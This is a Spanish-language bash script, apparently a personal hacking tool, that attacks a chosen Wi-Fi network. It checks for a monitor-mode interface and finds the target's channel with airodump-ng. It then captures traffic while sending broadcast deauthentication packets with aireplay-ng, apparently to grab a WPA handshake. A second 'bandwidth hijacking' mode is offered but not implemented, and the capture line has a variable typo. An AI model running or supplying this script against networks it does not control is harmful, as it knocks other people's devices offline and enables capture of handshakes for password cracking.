#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!]${endColour} Saliendo...\n\n"
  exit 1 
}

trap ctrl_c INT


function help(){
  echo -e "\n\t${purpleColour}[i]${endColour}${grayColour} Uso de la herramienta:${endColour}\n"
  echo -e "\t${greenColour}$0${endColour} ${purpleColour}-g${endColour} ${yellowColour}{essid_target} {bssid_target} {interface_mode_monitor} {channel_target}${endColour}"
}

function getConfs(){
  if [[ $EUID -ne 0 ]]; then 
    echo -e "\n\n\t${redColour}[!]${endColour} ${grayColour}El script necesita ejecutarse como sudo ツ${endColour}\n\n"
    exit 
  fi
  essid=$1
  bssid=$2
  interface=$3
  channel=$4
  echo -e "\n${turquoiseColour}[i]${endColour} ${grayColour}Se comprobará que la interfaz${endColour} ${turquoiseColour}$interface${endColour} ${grayColour}tenga modo monitor.${endColour}\n"
  modeMonitorON=$(/usr/sbin/iwconfig $interface | /usr/bin/grep -i "Mode:" | /usr/bin/awk '{print $4}')
  if [ "$modeMonitorON" ]; then
    echo -e "${greenColour}[i]${endColour} ${grayColour}Se verifico${endColour} ${greenColour}exitosamente${endColour} ${grayColour}el modo monitor de${endColour} ${turquoiseColour}$interface${endColour}${grayColour}.${endColour}"
      if [ "$channel" ]; then
        getHash $essid $bssid $channel $interface
      else 
        echo -e "${redColour}[!]${endColour} ${grayColour}El canal de la red${endColour} ${redColour}no${endColour} ${grayColour}ha sido proporcionado, intentaremos buscar el mismo, porfavor aguarda un momento...${endColour}"
        /usr/sbin/airodump-ng $interface > temp &
        sleep 10
        kill $!
      if /usr/bin/test -f temp; then
          channel=$(/usr/bin/grep $bssid temp | /usr/bin/sort -u | /usr/bin/awk '{print $6}' | /usr/bin/sort -u | /usr/bin/xargs | /usr/bin/awk 'NF{print $NF}')
          /usr/bin/rm temp
        if [[ "$channel" ]]; then 
           echo -e "\n${greenColour}[*]${endColour} ${grayColour}Se ha encontrado el canal${endColour} ${greenColour}--->${endColour} ${redColour}$channel${endColour}${grayColour}.${endColour}" 
           getHash $essid $bssid $channel $interface 
          else 
             echo -e "\n${redColour}[!]${endColour} ${grayColour}No ha sido posible encontrar el canal del la red${endColour} ${redColour}$bssid${endColour}${grayColour}, porfavor no olvides ingresarlo.${endColour}"
             exit 1 
          fi
        else
          error "No se pudo analizar el trafico de la red."
        fi
      fi
    fi 
}

function getHash(){
    essid=$1
    bssid=$2
    channel=$3
    interface=$4
    echo -e "\n\t${turquoiseColour}[i]${endColour} ${grayColour}Se realizara un ataque a la red${endColour} ${redColour}$bssid${endColour} ${grayColour}en el canal${endColour} ${redColour}$channel${endColour} ${grayColour}con la interfaz de red${endColour} ${purpleColour}$interface${endColour}${grayColour}.${endColour}"
    echo -e "\n\t${purpleColour}[!]${endColour} ${grayColour}Seleccione el modo de ataque:${endColour} "
    echo -e "\t\t${turquoiseColour}-${endColour} ${grayColour}Ingrese${endColour} ${turquoiseColour}\"d\"${endColour} ${grayColour}para un ataque de deautenticación.${endColour}"
    echo -e "\t\t${turquoiseColour}-${endColour} ${grayColour}Ingrese${endColour} ${turquoiseColour}\"s\"${endColour} ${grayColour}para un ataque de secuestro de ancho de banda.${endColour}"
    echo -e "${purpleColour}[!]${endColour} ${grayColour}Ataque${endColour}${purpleColour}:${endColour} " && read attack
    if [ "$attack" = "d" ] || [ "$attack" = "s" ]; then
      echo -e "\n\n\t\t${purpleColour}[*]${endColour} ${grayColour}Se ejecutara el ataque de${endColour} ${purpleColour}$([ "$attack" = "d" ] && echo 'deautenticación.' || echo 'secuestro de ancho de banda.')${endColour}"
      echo -e "\n${redColour}--------------------------------------------------------------------------------------------${endColour}"
      echo -e "${redColour}|${endColour}          ${grayColour}BSSID${endColour}            ${redColour}|${endColour}           ${grayColour}CANAL${endColour}             ${redColour}|${endColour}           ${grayColour}INTERFAZ${endColour}             ${redColour}|${endColour}"
      echo -e "${redColour}--------------------------------------------------------------------------------------------${endColour}"
      echo -e "${redColour}|${endColour}    ${grayColour}$bssid${endColour}      ${redColour}|${endColour}              ${grayColour}$channel${endColour}              ${redColour}|${endColour}           ${grayColour}$interface${endColour}             ${redColour}|${endColour}"
      echo -e "${redColour}--------------------------------------------------------------------------------------------${endColour}"
      # ATAQUE DE DEAUTENTICACION
      if [ "$attack" = "d" ]; then
          echo -e "\n${turquoiseColour}[i]${endColour} ${grayColour}Guardando la captura de la red en el archivo${endColour} ${turquoiseColour}captura${endColour}\n\n"
          echo -e "${redColour}[!]${endColour} ${grayColour}Enviando${endColour} ${endColour}${redColour}10${endColour} ${grayColour}paquetes de deautenticación a la red${endColour} ${redColour}$bssid${endColour} ${grayColour}por el canal${endColour} ${redColour}$channel${endColour}${grayColour}.${endColour}"
          /usr/sbin/airodump-ng --bssid $bssid -c $channel -w captura $interfaz &>/dev/null & 
          /usr/sbin/aireplay-ng -0 10 -e $essid -a $bssid -c FF:FF:FF:FF:FF:FF $interface 2>/dev/null 1>packages
          /usr/bin/cat packages
      fi
    else 
      error "La opcion de ataque  $attack no existe."
    fi
}

function error(){
  error=$1
  echo -e "\n\n\t${redColour}[!]${endColour} ${grayColour}Error:${endColour} ${redColour}$error${endColour}\n\n"
  exit 1 
}



declare -i selector=0

while getopts "g:h" arg; do
  case $arg in
    g) essid=$OPTARG; bssid=$3 interface=$4; channel=$5; let selector+=1;;
    h) ;;
  esac
done

if [ $selector -eq 1 ]; then
  getConfs $essid $bssid $interface $channel
else 
  help
fi

